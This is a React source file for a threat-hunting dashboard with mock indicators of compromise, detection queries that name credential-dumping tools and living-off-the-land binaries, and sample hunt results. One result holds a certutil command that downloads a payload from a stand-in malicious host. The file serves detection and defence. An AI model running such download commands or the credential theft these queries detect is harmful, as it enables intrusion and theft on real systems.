import React, { useState } from 'react';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Badge } from '@/components/ui/badge';
import { ScrollArea } from '@/components/ui/scroll-area';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Textarea } from '@/components/ui/textarea';
import { 
  Search, Target, AlertTriangle, Shield, Activity, 
  FileSearch, Clock, Play, Pause, Eye, Download,
  Crosshair, Skull, Bug, Network, Loader2
} from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { useThreatHunts } from '@/hooks/useHorizon';
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";

interface ThreatIndicator {
  id: string;
  type: 'hash' | 'ip' | 'domain' | 'url' | 'file_path' | 'registry';
  value: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  source: string;
  description: string;
  matchCount: number;
  lastSeen?: string;
  mitreAttack?: string;
}

interface HuntQuery {
  id: string;
  name: string;
  query: string;
  description: string;
  category: string;
  lastRun?: string;
  matchCount?: number;
}

interface HuntResult {
  id: string;
  queryId: string;
  deviceName: string;
  matchedValue: string;
  timestamp: string;
  severity: string;
  details: Record<string, string>;
}

export const ThreatHuntingDashboard: React.FC = () => {
  const { toast } = useToast();
  const { hunts, isLoading, createHunt, startHunt } = useThreatHunts();
  const [searchQuery, setSearchQuery] = useState('');
  const [selectedIndicatorType, setSelectedIndicatorType] = useState<string>('all');
  const [isHunting, setIsHunting] = useState(false);
  const [customIoc, setCustomIoc] = useState('');

  const [indicators] = useState<ThreatIndicator[]>([
    {
      id: '1',
      type: 'hash',
      value: 'a1b2c3d4e5f6...',
      severity: 'critical',
      source: 'VirusTotal',
      description: 'Known Emotet dropper',
      matchCount: 2,
      lastSeen: new Date(Date.now() - 3600000).toISOString(),
      mitreAttack: 'T1566.001'
    },
    {
      id: '2',
      type: 'ip',
      value: '185.234.72.21',
      severity: 'high',
      source: 'AlienVault OTX',
      description: 'C2 server for Cobalt Strike',
      matchCount: 5,
      lastSeen: new Date(Date.now() - 7200000).toISOString(),
      mitreAttack: 'T1071'
    },
    {
      id: '3',
      type: 'domain',
      value: 'malicious-update.com',
      severity: 'high',
      source: 'Threat Intel Feed',
      description: 'Phishing domain impersonating software updates',
      matchCount: 0,
      mitreAttack: 'T1566.002'
    },
    {
      id: '4',
      type: 'file_path',
      value: 'C:\\Users\\*\\AppData\\Local\\Temp\\*.ps1',
      severity: 'medium',
      source: 'Internal Hunt',
      description: 'Suspicious PowerShell in temp directory',
      matchCount: 12,
      lastSeen: new Date().toISOString(),
      mitreAttack: 'T1059.001'
    },
    {
      id: '5',
      type: 'registry',
      value: 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\*malware*',
      severity: 'critical',
      source: 'YARA Rule',
      description: 'Persistence via Run key',
      matchCount: 1,
      lastSeen: new Date(Date.now() - 86400000).toISOString(),
      mitreAttack: 'T1547.001'
    }
  ]);

  const [huntQueries] = useState<HuntQuery[]>([
    {
      id: '1',
      name: 'Encoded PowerShell Commands',
      query: 'process_command_line contains "-EncodedCommand" OR process_command_line contains "-enc"',
      description: 'Detect base64 encoded PowerShell execution',
      category: 'Execution',
      lastRun: new Date(Date.now() - 1800000).toISOString(),
      matchCount: 3
    },
    {
      id: '2',
      name: 'LOLBAS Execution',
      query: 'process_name in ("certutil.exe", "mshta.exe", "regsvr32.exe", "rundll32.exe")',
      description: 'Living-off-the-land binary execution',
      category: 'Defense Evasion',
      lastRun: new Date(Date.now() - 3600000).toISOString(),
      matchCount: 8
    },
    {
      id: '3',
      name: 'Lateral Movement via PsExec',
      query: 'process_name = "psexec.exe" OR service_name contains "PSEXESVC"',
      description: 'PsExec-based lateral movement detection',
      category: 'Lateral Movement',
      matchCount: 0
    },
    {
      id: '4',
      name: 'Credential Dumping Indicators',
      query: 'file_path contains "lsass" OR process_name in ("mimikatz.exe", "procdump.exe")',
      description: 'Detect credential theft attempts',
      category: 'Credential Access',
      lastRun: new Date(Date.now() - 7200000).toISOString(),
      matchCount: 1
    }
  ]);

  const [huntResults] = useState<HuntResult[]>([
    {
      id: '1',
      queryId: '1',
      deviceName: 'WORKSTATION-05',
      matchedValue: 'powershell.exe -EncodedCommand SGVsbG8gV29ybGQ=',
      timestamp: new Date(Date.now() - 1800000).toISOString(),
      severity: 'high',
      details: { user: 'john.doe', pid: '4532' }
    },
    {
      id: '2',
      queryId: '2',
      deviceName: 'SERVER-WEB-01',
      matchedValue: 'certutil.exe -urlcache -split -f http://malicious.com/payload.exe',
      timestamp: new Date(Date.now() - 3600000).toISOString(),
      severity: 'critical',
      details: { user: 'SYSTEM', pid: '2156' }
    }
  ]);

  const handleRunHunt = (query: HuntQuery) => {
    setIsHunting(true);
    toast({
      title: "Hunt Started",
      description: `Running "${query.name}" across all endpoints...`
    });
    
    setTimeout(() => {
      setIsHunting(false);
      toast({
        title: "Hunt Complete",
        description: `Found ${Math.floor(Math.random() * 10)} matches.`
      });
    }, 3000);
  };

  const handleAddIoc = () => {
    if (!customIoc.trim()) return;
    toast({
      title: "IOC Added",
      description: "Custom indicator has been added to the hunt list."
    });
    setCustomIoc('');
  };

  const getSeverityBadge = (severity: string) => {
    const variants: Record<string, string> = {
      critical: 'bg-red-500/10 text-red-500 border-red-500/20',
      high: 'bg-orange-500/10 text-orange-500 border-orange-500/20',
      medium: 'bg-yellow-500/10 text-yellow-500 border-yellow-500/20',
      low: 'bg-blue-500/10 text-blue-500 border-blue-500/20'
    };
    return <Badge className={variants[severity] || ''}>{severity}</Badge>;
  };

  const getTypeIcon = (type: string) => {
    const icons: Record<string, React.ReactNode> = {
      hash: <FileSearch className="h-4 w-4" />,
      ip: <Network className="h-4 w-4" />,
      domain: <Target className="h-4 w-4" />,
      url: <Target className="h-4 w-4" />,
      file_path: <Bug className="h-4 w-4" />,
      registry: <Shield className="h-4 w-4" />
    };
    return icons[type] || <AlertTriangle className="h-4 w-4" />;
  };

  const filteredIndicators = indicators.filter(ind => 
    (selectedIndicatorType === 'all' || ind.type === selectedIndicatorType) &&
    (ind.value.toLowerCase().includes(searchQuery.toLowerCase()) ||
     ind.description.toLowerCase().includes(searchQuery.toLowerCase()))
  );

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-2xl font-bold flex items-center gap-2">
            <Crosshair className="h-6 w-6" />
            Threat Hunting
          </h2>
          <p className="text-muted-foreground">Proactive threat detection and IOC searches</p>
        </div>
        <div className="flex gap-2">
          <Button variant="outline">
            <Download className="h-4 w-4 mr-2" />
            Import IOCs
          </Button>
          <Button>
            <Play className="h-4 w-4 mr-2" />
            Run All Hunts
          </Button>
        </div>
      </div>

      {/* Stats Overview */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
        <Card>
          <CardContent className="pt-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm text-muted-foreground">Active IOCs</p>
                <p className="text-2xl font-bold">{indicators.length}</p>
              </div>
              <Target className="h-8 w-8 text-muted-foreground" />
            </div>
          </CardContent>
        </Card>
        <Card>
          <CardContent className="pt-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm text-muted-foreground">Total Matches</p>
                <p className="text-2xl font-bold text-red-500">
                  {indicators.reduce((acc, i) => acc + i.matchCount, 0)}
                </p>
              </div>
              <AlertTriangle className="h-8 w-8 text-red-500" />
            </div>
          </CardContent>
        </Card>
        <Card>
          <CardContent className="pt-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm text-muted-foreground">Hunt Queries</p>
                <p className="text-2xl font-bold">{huntQueries.length}</p>
              </div>
              <Search className="h-8 w-8 text-muted-foreground" />
            </div>
          </CardContent>
        </Card>
        <Card>
          <CardContent className="pt-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm text-muted-foreground">Critical Findings</p>
                <p className="text-2xl font-bold text-red-500">
                  {indicators.filter(i => i.severity === 'critical' && i.matchCount > 0).length}
                </p>
              </div>
              <Skull className="h-8 w-8 text-red-500" />
            </div>
          </CardContent>
        </Card>
      </div>

      <Tabs defaultValue="indicators" className="space-y-4">
        <TabsList>
          <TabsTrigger value="indicators">IOC Library</TabsTrigger>
          <TabsTrigger value="queries">Hunt Queries</TabsTrigger>
          <TabsTrigger value="results">Hunt Results</TabsTrigger>
          <TabsTrigger value="custom">Custom Hunt</TabsTrigger>
        </TabsList>

        <TabsContent value="indicators" className="space-y-4">
          <Card>
            <CardHeader>
              <div className="flex items-center justify-between">
                <CardTitle>Indicators of Compromise</CardTitle>
                <div className="flex items-center gap-2">
                  <Select value={selectedIndicatorType} onValueChange={setSelectedIndicatorType}>
                    <SelectTrigger className="w-32">
                      <SelectValue placeholder="Filter type" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="all">All Types</SelectItem>
                      <SelectItem value="hash">Hash</SelectItem>
                      <SelectItem value="ip">IP Address</SelectItem>
                      <SelectItem value="domain">Domain</SelectItem>
                      <SelectItem value="file_path">File Path</SelectItem>
                      <SelectItem value="registry">Registry</SelectItem>
                    </SelectContent>
                  </Select>
                  <div className="relative">
                    <Search className="absolute left-2 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                    <Input 
                      placeholder="Search IOCs..." 
                      className="pl-8 w-48"
                      value={searchQuery}
                      onChange={(e) => setSearchQuery(e.target.value)}
                    />
                  </div>
                </div>
              </div>
            </CardHeader>
            <CardContent>
              <ScrollArea className="h-[400px]">
                <div className="space-y-3">
                  {filteredIndicators.map((indicator) => (
                    <div key={indicator.id} className="flex items-center justify-between p-4 border rounded-lg">
                      <div className="flex items-center gap-4">
                        <div className="p-2 bg-muted rounded-lg">
                          {getTypeIcon(indicator.type)}
                        </div>
                        <div>
                          <div className="flex items-center gap-2">
                            <code className="text-sm font-mono">{indicator.value}</code>
                            {indicator.mitreAttack && (
                              <Badge variant="outline" className="text-xs">{indicator.mitreAttack}</Badge>
                            )}
                          </div>
                          <p className="text-sm text-muted-foreground">{indicator.description}</p>
                          <p className="text-xs text-muted-foreground mt-1">
                            Source: {indicator.source}
                            {indicator.lastSeen && ` • Last seen: ${new Date(indicator.lastSeen).toLocaleString()}`}
                          </p>
                        </div>
                      </div>
                      <div className="flex items-center gap-3">
                        {indicator.matchCount > 0 && (
                          <Badge variant="destructive">{indicator.matchCount} matches</Badge>
                        )}
                        {getSeverityBadge(indicator.severity)}
                        <Button variant="outline" size="sm">
                          <Eye className="h-4 w-4" />
                        </Button>
                      </div>
                    </div>
                  ))}
                </div>
              </ScrollArea>
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="queries" className="space-y-4">
          <Card>
            <CardHeader>
              <CardTitle>Saved Hunt Queries</CardTitle>
              <CardDescription>Pre-built queries for common threat patterns</CardDescription>
            </CardHeader>
            <CardContent>
              <div className="space-y-4">
                {huntQueries.map((query) => (
                  <div key={query.id} className="border rounded-lg p-4">
                    <div className="flex items-center justify-between mb-2">
                      <div className="flex items-center gap-2">
                        <h4 className="font-medium">{query.name}</h4>
                        <Badge variant="outline">{query.category}</Badge>
                      </div>
                      <div className="flex items-center gap-2">
                        {query.matchCount !== undefined && query.matchCount > 0 && (
                          <Badge variant="destructive">{query.matchCount} matches</Badge>
                        )}
                        <Button 
                          size="sm" 
                          onClick={() => handleRunHunt(query)}
                          disabled={isHunting}
                        >
                          {isHunting ? <Pause className="h-4 w-4 mr-1" /> : <Play className="h-4 w-4 mr-1" />}
                          Run
                        </Button>
                      </div>
                    </div>
                    <p className="text-sm text-muted-foreground mb-2">{query.description}</p>
                    <pre className="bg-muted p-2 rounded text-xs font-mono overflow-x-auto">{query.query}</pre>
                    {query.lastRun && (
                      <p className="text-xs text-muted-foreground mt-2">
                        Last run: {new Date(query.lastRun).toLocaleString()}
                      </p>
                    )}
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="results" className="space-y-4">
          <Card>
            <CardHeader>
              <CardTitle>Recent Hunt Results</CardTitle>
              <CardDescription>Matches found during threat hunting operations</CardDescription>
            </CardHeader>
            <CardContent>
              <ScrollArea className="h-[400px]">
                <div className="space-y-3">
                  {huntResults.map((result) => (
                    <div key={result.id} className="border rounded-lg p-4 border-l-4 border-l-red-500">
                      <div className="flex items-center justify-between mb-2">
                        <div className="flex items-center gap-2">
                          <AlertTriangle className="h-4 w-4 text-red-500" />
                          <span className="font-medium">{result.deviceName}</span>
                          {getSeverityBadge(result.severity)}
                        </div>
                        <span className="text-xs text-muted-foreground">
                          {new Date(result.timestamp).toLocaleString()}
                        </span>
                      </div>
                      <pre className="bg-muted p-2 rounded text-xs font-mono overflow-x-auto mb-2">
                        {result.matchedValue}
                      </pre>
                      <div className="flex gap-4 text-xs text-muted-foreground">
                        {Object.entries(result.details).map(([key, value]) => (
                          <span key={key}>{key}: {value}</span>
                        ))}
                      </div>
                    </div>
                  ))}
                </div>
              </ScrollArea>
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="custom" className="space-y-4">
          <Card>
            <CardHeader>
              <CardTitle>Custom IOC Search</CardTitle>
              <CardDescription>Add custom indicators or run ad-hoc searches</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label>IOC Type</Label>
                  <Select defaultValue="hash">
                    <SelectTrigger>
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="hash">File Hash (MD5/SHA256)</SelectItem>
                      <SelectItem value="ip">IP Address</SelectItem>
                      <SelectItem value="domain">Domain</SelectItem>
                      <SelectItem value="url">URL</SelectItem>
                      <SelectItem value="file_path">File Path</SelectItem>
                      <SelectItem value="registry">Registry Key</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                <div className="space-y-2">
                  <Label>Severity</Label>
                  <Select defaultValue="high">
                    <SelectTrigger>
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="critical">Critical</SelectItem>
                      <SelectItem value="high">High</SelectItem>
                      <SelectItem value="medium">Medium</SelectItem>
                      <SelectItem value="low">Low</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              </div>
              <div className="space-y-2">
                <Label>IOC Value(s)</Label>
                <Textarea 
                  placeholder="Enter IOC values, one per line..."
                  className="font-mono"
                  rows={6}
                  value={customIoc}
                  onChange={(e) => setCustomIoc(e.target.value)}
                />
              </div>
              <div className="space-y-2">
                <Label>Description</Label>
                <Input placeholder="Brief description of the threat indicator..." />
              </div>
              <div className="flex gap-2">
                <Button onClick={handleAddIoc}>
                  <Search className="h-4 w-4 mr-2" />
                  Add & Hunt
                </Button>
                <Button variant="outline">
                  Save to Library
                </Button>
              </div>
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>
    </div>
  );
};
